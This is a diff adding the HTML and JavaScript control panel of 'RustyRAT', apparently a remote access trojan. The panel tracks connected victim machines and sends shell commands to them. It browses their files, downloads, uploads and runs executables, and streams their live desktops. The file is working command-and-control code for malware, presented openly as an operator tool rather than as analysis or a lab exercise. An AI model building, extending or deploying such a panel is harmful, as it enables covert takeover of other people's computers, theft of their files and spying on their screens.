@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RustyRAT Control Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <style>
+        .file-icon { width: 24px; height: 24px; }
+        .file-manager-content { height: calc(100vh - 200px); }
+        .context-menu {
+            position: absolute;
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            padding: 5px 0;
+            z-index: 1000;
+        }
+        .context-menu-item {
+            padding: 5px 20px;
+            cursor: pointer;
+        }
+        .context-menu-item:hover {
+            background-color: #f1f1f1;
+        }
+        .drag-over {
+            background-color: #e6f7ff;
+        }
+        /* Loader Styles */
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="container mx-auto p-4">
+        <h1 class="text-3xl font-bold mb-4">RustyRAT Control Panel</h1>
+
+        <div class="mb-4">
+            <ul class="flex border-b">
+                <li class="-mb-px mr-1">
+                    <a class="bg-white inline-block border-l border-t border-r rounded-t py-2 px-4 text-blue-700 font-semibold" href="#" onclick="showTab('remote-shell')">Remote Shell</a>
+                </li>
+                <li class="mr-1">
+                    <a class="bg-white inline-block py-2 px-4 text-blue-500 hover:text-blue-800 font-semibold" href="#" onclick="showTab('file-manager')">File Manager</a>
+                </li>
+                <li class="mr-1">
+                    <a class="bg-white inline-block py-2 px-4 text-blue-500 hover:text-blue-800 font-semibold" href="#" onclick="showTab('live-desktop')">Live Desktop</a>
+                </li>
+                <!-- Add more tabs here if needed -->
+            </ul>
+        </div>
+
+        <!-- Remote Shell Tab -->
+        <div id="remote-shell" class="tab-content">
+            <div class="mb-4">
+                <input type="text" id="commandInput" class="w-full p-2 border rounded" placeholder="Enter command">
+                <button onclick="sendCommand()" class="mt-2 bg-blue-500 text-white p-2 rounded">Send Command</button>
+            </div>
+
+            <div id="outputArea" class="bg-white p-4 rounded shadow-md h-64 overflow-y-auto mb-4"></div>
+        </div>
+
+        <!-- File Manager Tab -->
+        <div id="file-manager" class="tab-content hidden">
+            <div class="mb-4 flex">
+                <input type="text" id="pathInput" class="flex-grow p-2 border rounded" placeholder="Enter path">
+                <button onclick="listDirectory()" class="ml-2 bg-blue-500 text-white p-2 rounded">Go</button>
+                <button onclick="goUp()" class="ml-2 bg-blue-500 text-white p-2 rounded">Up</button>
+            </div>
+
+            <div class="bg-white rounded shadow-md mb-4 file-manager-content">
+                <div id="fileList" class="p-4 overflow-y-auto h-full" ondragover="event.preventDefault();" ondrop="handleDrop(event);"></div>
+            </div>
+        </div>
+
+        <!-- Live Desktop Tab -->
+        <div id="live-desktop" class="tab-content hidden">
+            <div class="mb-4 flex items-center">
+                <button onclick="startLiveDesktop()" class="bg-green-500 text-white p-2 rounded mr-2">Start Live Desktop</button>
+                <button onclick="stopLiveDesktop()" class="bg-red-500 text-white p-2 rounded">Stop Live Desktop</button>
+            </div>
+
+            <div class="bg-white rounded shadow-md mb-4">
+                <div class="loader" id="desktopLoader"></div>
+                <img id="liveDesktop" src="" alt="Live Desktop Stream" class="w-full rounded shadow-md hidden">
+            </div>
+        </div>
+
+        <!-- Connected Clients Section (Updated) -->
+        <div class="bg-white p-6 rounded-lg shadow-lg mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-gray-800">Connected Clients</h2>
+            <div class="overflow-x-auto">
+                <table class="min-w-full bg-white border border-gray-300">
+                    <thead class="bg-gray-800 text-white">
+                        <tr>
+                            <th class="py-3 px-4 text-left">
+                                <input type="checkbox" id="selectAll" onclick="toggleSelectAll(this)">
+                            </th>
+                            <th class="py-3 px-4 text-left">ID</th>
+                            <th class="py-3 px-4 text-left">IP Address</th>
+                            <th class="py-3 px-4 text-left">OS</th>
+                            <th class="py-3 px-4 text-left">Status</th>
+                            <th class="py-3 px-4 text-left">Last Seen</th>
+                        </tr>
+                    </thead>
+                    <tbody id="clientTableBody">
+                        <!-- Client rows will be dynamically inserted here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="contextMenu" class="context-menu hidden"></div>
+
+    <script>
+        const socket = io();
+        let selectedClients = [];
+        let currentPath = 'C:\\';
+        let draggedItem = null;
+
+        // Client tracking object
+        let clients = {}; // key: client.id, value: {id, ip, os, status, lastSeen}
+
+        // Variables for Live Desktop
+        let liveDesktopClientId = null;
+        let isLiveDesktopActive = false;
+
+        socket.on('connect', () => {
+            console.log('Connected to server');
+        });
+
+        // Updated client_list handler to populate the new table and initialize client status
+        socket.on('client_list', (clientList) => {
+            const tableBody = document.getElementById('clientTableBody');
+            tableBody.innerHTML = '';
+            clientList.forEach(client => {
+                // Initialize client in the clients object
+                clients[client.id] = {
+                    id: client.id,
+                    ip: client.ip,
+                    os: client.os,
+                    status: 'Online',
+                    lastSeen: new Date()
+                };
+
+                const statusClass = 'text-green-600';
+                const osColor = client.os === 'Windows 10' ? 'bg-blue-500' : 
+                                client.os === 'macOS' ? 'bg-gray-500' : 'bg-yellow-500';
+                const row = `
+                    <tr class="border-b border-gray-200 hover:bg-gray-100 transition duration-150">
+                        <td class="py-3 px-4">
+                            <input type="checkbox" value="${client.id}" onchange="updateSelectedClients(this)">
+                        </td>
+                        <td class="py-3 px-4">${client.id}</td>
+                        <td class="py-3 px-4">${client.ip}</td>
+                        <td class="py-3 px-4">
+                            <span class="inline-flex items-center">
+                                <span class="w-3 h-3 inline-block mr-2 rounded-full ${osColor}"></span>
+                                ${client.os}
+                            </span>
+                        </td>
+                        <td class="py-3 px-4">
+                            <span class="font-semibold ${statusClass}" id="status-${client.id}">Online</span>
+                        </td>
+                        <td class="py-3 px-4" id="lastSeen-${client.id}">${formatDate(clients[client.id].lastSeen)}</td>
+                    </tr>
+                `;
+                tableBody.innerHTML += row;
+            });
+        });
+
+        socket.on('output', (message) => {
+            const outputArea = document.getElementById('outputArea');
+            outputArea.innerHTML += message + '<br>';
+            outputArea.scrollTop = outputArea.scrollHeight;
+
+            // Assume message contains client_id, update lastSeen and status
+            if (message.includes('Client ID:')) {
+                const clientId = extractClientId(message);
+                if (clientId && clients[clientId]) {
+                    updateClientActivity(clientId);
+                }
+            }
+        });
+
+        // Live Desktop Event Listener
+        socket.on('desktop_capture', (data) => {
+            const { client_id, image } = data;
+            if (isLiveDesktopActive && client_id === liveDesktopClientId) {
+                const liveDesktopImg = document.getElementById('liveDesktop');
+                liveDesktopImg.src = 'data:image/jpeg;base64,' + image;
+            }
+
+            // Update client activity
+            if (clients[client_id]) {
+                updateClientActivity(client_id);
+            }
+        });
+
+        socket.on('file_list', (data) => {
+            const { client_id, files } = data;
+            if (selectedClients.includes(client_id)) {
+                displayFileList(files);
+
+                // Update client activity
+                if (clients[client_id]) {
+                    updateClientActivity(client_id);
+                }
+            }
+        });
+
+        socket.on('file_content', (data) => {
+            const { client_id, file_name, content } = data;
+            if (selectedClients.includes(client_id)) {
+                downloadFileContent(file_name, content);
+
+                // Update client activity
+                if (clients[client_id]) {
+                    updateClientActivity(client_id);
+                }
+            }
+        });
+
+        socket.on('operation_result', (data) => {
+            const { client_id, success, message } = data;
+            alert(`Client ${client_id}: ${message}`);
+            if (success) {
+                listDirectory();
+            }
+
+            // Update client activity
+            if (clients[client_id]) {
+                updateClientActivity(client_id);
+            }
+        });
+
+        socket.on('error', (data) => {
+            if (typeof data === 'string') {
+                alert('Error: ' + data);
+            } else if (typeof data === 'object') {
+                alert(`Error from Client ${data.client_id}: ${data.message}`);
+            }
+
+            // Update client activity if error is from a client
+            if (data.client_id && clients[data.client_id]) {
+                updateClientActivity(data.client_id);
+            }
+        });
+
+        // Helper function to extract client ID from messages (Assuming message format includes 'Client ID: X')
+        function extractClientId(message) {
+            const regex = /Client ID:\s*(\d+)/;
+            const match = message.match(regex);
+            return match ? match[1] : null;
+        }
+
+        // Helper function to format Date objects to readable strings
+        function formatDate(date) {
+            return date.toLocaleString();
+        }
+
+        // Function to update client activity
+        function updateClientActivity(clientId) {
+            const now = new Date();
+            clients[clientId].lastSeen = now;
+            clients[clientId].status = 'Online';
+            document.getElementById(`status-${clientId}`).textContent = 'Online';
+            document.getElementById(`status-${clientId}`).className = 'font-semibold text-green-600';
+            document.getElementById(`lastSeen-${clientId}`).textContent = formatDate(now);
+        }
+
+        // Function to toggle select all checkboxes
+        function toggleSelectAll(source) {
+            const checkboxes = document.querySelectorAll('#clientTableBody input[type="checkbox"]');
+            selectedClients = [];
+            checkboxes.forEach(checkbox => {
+                checkbox.checked = source.checked;
+                if (source.checked) {
+                    selectedClients.push(checkbox.value);
+                }
+            });
+
+            // If multiple clients are selected and live desktop is active, disable it
+            if (isLiveDesktopActive && selectedClients.length !== 1) {
+                alert('Live Desktop can only be active for one client at a time. It will be stopped.');
+                stopLiveDesktop();
+            }
+        }
+
+        // Function to update selected clients based on individual checkbox
+        function updateSelectedClients(checkbox) {
+            const clientId = checkbox.value;
+            if (checkbox.checked) {
+                if (!selectedClients.includes(clientId)) {
+                    selectedClients.push(clientId);
+                }
+                // If it's the first selected client, reset the current path
+                if (selectedClients.length === 1) {
+                    currentPath = 'C:\\';
+                    listDirectory();
+                }
+            } else {
+                selectedClients = selectedClients.filter(id => id !== clientId);
+            }
+
+            // Update the "Select All" checkbox state
+            const selectAllCheckbox = document.getElementById('selectAll');
+            const allCheckboxes = document.querySelectorAll('#clientTableBody input[type="checkbox"]');
+            const allChecked = Array.from(allCheckboxes).every(cb => cb.checked);
+            const someChecked = Array.from(allCheckboxes).some(cb => cb.checked);
+            selectAllCheckbox.checked = allChecked;
+            selectAllCheckbox.indeterminate = !allChecked && someChecked;
+
+            // If multiple clients are selected and live desktop is active, disable it
+            if (isLiveDesktopActive && selectedClients.length !== 1) {
+                alert('Live Desktop can only be active for one client at a time. It will be stopped.');
+                stopLiveDesktop();
+            }
+        }
+
+        // Function to send commands to selected clients
+        function sendCommand() {
+            const command = document.getElementById('commandInput').value;
+            if (command.trim() === '') {
+                alert('Please enter a command.');
+                return;
+            }
+            if (selectedClients.length === 0) {
+                alert('Please select at least one client.');
+                return;
+            }
+            socket.emit('command', { command, clients: selectedClients });
+            document.getElementById('commandInput').value = '';
+        }
+
+        // Function to show specific tab
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.add('hidden'));
+            document.getElementById(tabName).classList.remove('hidden');
+        }
+
+        // Function to list directory contents
+        function listDirectory() {
+            if (selectedClients.length === 0) {
+                alert('Please select a client first.');
+                return;
+            }
+            currentPath = document.getElementById('pathInput').value || currentPath;
+            socket.emit('list_directory', { client_id: selectedClients[0], path: currentPath });
+        }
+
+        // Function to go up one directory
+        function goUp() {
+            const parts = currentPath.split('\\');
+            if (parts.length > 1) {
+                parts.pop();
+                currentPath = parts.join('\\') || 'C:\\';
+                document.getElementById('pathInput').value = currentPath;
+                listDirectory();
+            }
+        }
+
+        // Function to display file list
+        function displayFileList(files) {
+            const fileList = document.getElementById('fileList');
+            fileList.innerHTML = '';
+            document.getElementById('pathInput').value = currentPath;
+            files.forEach(file => {
+                const div = document.createElement('div');
+                div.className = 'flex items-center p-2 hover:bg-gray-100 cursor-pointer';
+                div.draggable = true;
+                const icon = file.Attributes === 'Directory' ? 'fa-folder' : 'fa-file';
+                div.innerHTML = `
+                    <i class="fas ${icon} text-blue-500 mr-2 file-icon"></i>
+                    <span class="flex-grow">${file.Name}</span>
+                    <span class="text-sm text-gray-500 mr-2">${new Date(file.LastWriteTime * 1000).toLocaleString()}</span>
+                    <span class="text-sm text-gray-500">${file.Length} bytes</span>
+                `;
+                div.onclick = (e) => {
+                    if (file.Attributes === 'Directory') {
+                        currentPath = file.FullPath;
+                        document.getElementById('pathInput').value = currentPath;
+                        listDirectory();
+                    } else {
+                        showContextMenu(e, file);
+                    }
+                };
+                div.oncontextmenu = (e) => {
+                    e.preventDefault();
+                    showContextMenu(e, file);
+                };
+                div.ondragstart = (e) => {
+                    draggedItem = file;
+                };
+                div.ondragover = (e) => {
+                    e.preventDefault();
+                    if (file.Attributes === 'Directory') {
+                        e.currentTarget.classList.add('drag-over');
+                    }
+                };
+                div.ondragleave = (e) => {
+                    e.currentTarget.classList.remove('drag-over');
+                };
+                div.ondrop = (e) => {
+                    e.preventDefault();
+                    e.currentTarget.classList.remove('drag-over');
+                    if (file.Attributes === 'Directory' && draggedItem) {
+                        moveFile(draggedItem.Name, file.FullPath + '\\' + draggedItem.Name);
+                    }
+                };
+                fileList.appendChild(div);
+            });
+        }
+
+        // Function to show context menu
+        function showContextMenu(e, file) {
+            const contextMenu = document.getElementById('contextMenu');
+            contextMenu.innerHTML = '';
+            contextMenu.style.left = e.pageX + 'px';
+            contextMenu.style.top = e.pageY + 'px';
+
+            const actions = file ? [
+                { name: 'Download', action: () => downloadFile(file.Name) },
+                { name: 'Delete', action: () => deleteFile(file.Name) },
+                { name: 'Rename', action: () => renameFile(file.Name) }
+            ] : [
+                { name: 'New Folder', action: createNewFolder },
+                { name: 'Upload Here', action: uploadFile }
+            ];
+
+            // Add "Run" option for executable files
+            if (file && (file.Name.endsWith('.exe') || file.Name.endsWith('.bat'))) {
+                actions.push({ name: 'Run', action: () => runFile(file.FullPath) });
+            }
+
+            actions.forEach(action => {
+                const item = document.createElement('div');
+                item.className = 'context-menu-item';
+                item.textContent = action.name;
+                item.onclick = () => {
+                    action.action();
+                    contextMenu.classList.add('hidden');
+                };
+                contextMenu.appendChild(item);
+            });
+
+            contextMenu.classList.remove('hidden');
+        }
+
+        // Hide context menu on clicking outside
+        document.addEventListener('click', () => {
+            document.getElementById('contextMenu').classList.add('hidden');
+        });
+
+        // Function to download a file
+        function downloadFile(fileName) {
+            if (selectedClients.length === 0) {
+                alert('Please select a client first.');
+                return;
+            }
+            socket.emit('download_file', {
+                client_id: selectedClients[0],
+                file_path: currentPath + '\\' + fileName
+            });
+        }
+
+        // Function to delete a file
+        function deleteFile(fileName) {
+            if (selectedClients.length === 0) {
+                alert('Please select a client first.');
+                return;
+            }
+            if (confirm(`Are you sure you want to delete ${fileName}?`)) {
+                socket.emit('delete_file', {
+                    client_id: selectedClients[0],
+                    file_path: currentPath + '\\' + fileName
+                });
+            }
+        }
+
+        // Function to rename a file
+        function renameFile(oldName) {
+            const newName = prompt(`Enter new name for ${oldName}:`);
+            if (newName && selectedClients.length > 0) {
+                socket.emit('rename_file', {
+                    client_id: selectedClients[0],
+                    old_path: currentPath + '\\' + oldName,
+                    new_path: currentPath + '\\' + newName
+                });
+            }
+        }
+
+        // Function to create a new folder
+        function createNewFolder() {
+            const folderName = prompt('Enter new folder name:');
+            if (folderName && selectedClients.length > 0) {
+                socket.emit('create_folder', {
+                    client_id: selectedClients[0],
+                    folder_path: currentPath + '\\' + folderName
+                });
+            }
+        }
+
+        // Function to upload a file
+        function uploadFile() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = (e) => {
+                const file = e.target.files[0];
+                if (file && selectedClients.length > 0) {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const content = btoa(e.target.result);
+                        socket.emit('upload_file', {
+                            client_id: selectedClients[0],
+                            file_path: currentPath + '\\' + file.name,
+                            file_content: content
+                        });
+                    };
+                    reader.readAsBinaryString(file);
+                }
+            };
+            input.click();
+        }
+
+        // Function to move a file
+        function moveFile(fileName, newPath) {
+            if (selectedClients.length === 0) {
+                alert('Please select a client first.');
+                return;
+            }
+            socket.emit('move_file', {
+                client_id: selectedClients[0],
+                old_path: currentPath + '\\' + fileName,
+                new_path: newPath
+            });
+        }
+
+        // Function to handle file drop
+        function handleDrop(e) {
+            e.preventDefault();
+            if (draggedItem) {
+                moveFile(draggedItem.Name, currentPath + '\\' + draggedItem.Name);
+            }
+        }
+
+        // Function to run a file
+        function runFile(filePath) {
+            if (selectedClients.length === 0) {
+                alert('Please select a client first.');
+                return;
+            }
+            socket.emit('run_file', {
+                client_id: selectedClients[0],
+                file_path: filePath
+            });
+        }
+
+        // Function to download file content
+        function downloadFileContent(fileName, content) {
+            const link = document.createElement('a');
+            link.href = 'data:application/octet-stream;base64,' + content;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Function to start live desktop capture
+        function startLiveDesktop() {
+            if (selectedClients.length !== 1) {
+                alert('Please select exactly one client to start live desktop capture.');
+                return;
+            }
+            const clientId = selectedClients[0];
+            liveDesktopClientId = clientId;
+            isLiveDesktopActive = true;
+
+            // Show loader and hide image initially
+            document.getElementById('desktopLoader').style.display = 'block';
+            document.getElementById('liveDesktop').classList.add('hidden');
+
+            socket.emit('start_desktop_capture', { client_id: clientId });
+            alert(`Started live desktop capture for client: ${clientId}`);
+        }
+
+        // Function to stop live desktop capture
+        function stopLiveDesktop() {
+            if (!isLiveDesktopActive) {
+                alert('Live desktop capture is not active.');
+                return;
+            }
+            socket.emit('stop_desktop_capture', { client_id: liveDesktopClientId });
+            isLiveDesktopActive = false;
+            liveDesktopClientId = null;
+
+            // Hide image and hide loader
+            document.getElementById('liveDesktop').classList.add('hidden');
+            document.getElementById('desktopLoader').style.display = 'none';
+
+            alert('Stopped live desktop capture.');
+        }
+
+        // Listen for image load to hide loader and show image
+        document.getElementById('liveDesktop').addEventListener('load', () => {
+            document.getElementById('desktopLoader').style.display = 'none';
+            document.getElementById('liveDesktop').classList.remove('hidden');
+        });
+
+        // Function to periodically check and update client statuses
+        setInterval(() => {
+            const now = new Date();
+            Object.keys(clients).forEach(clientId => {
+                const client = clients[clientId];
+                const timeDiff = (now - client.lastSeen) / 1000; // in seconds
+                if (timeDiff > 30 && client.status !== 'Offline') {
+                    client.status = 'Offline';
+                    document.getElementById(`status-${clientId}`).textContent = 'Offline';
+                    document.getElementById(`status-${clientId}`).className = 'font-semibold text-red-600';
+                }
+            });
+        }, 30000); // 30 seconds
+
+        // Initial setup: If client is connected, set status to Online and lastSeen to now
+        socket.on('connect', () => {
+            socket.emit('request_client_list');
+        });
+
+        // Request client list initially
+        window.onload = () => {
+            socket.emit('request_client_list');
+        };
+    </script>
+</body>
+</html>
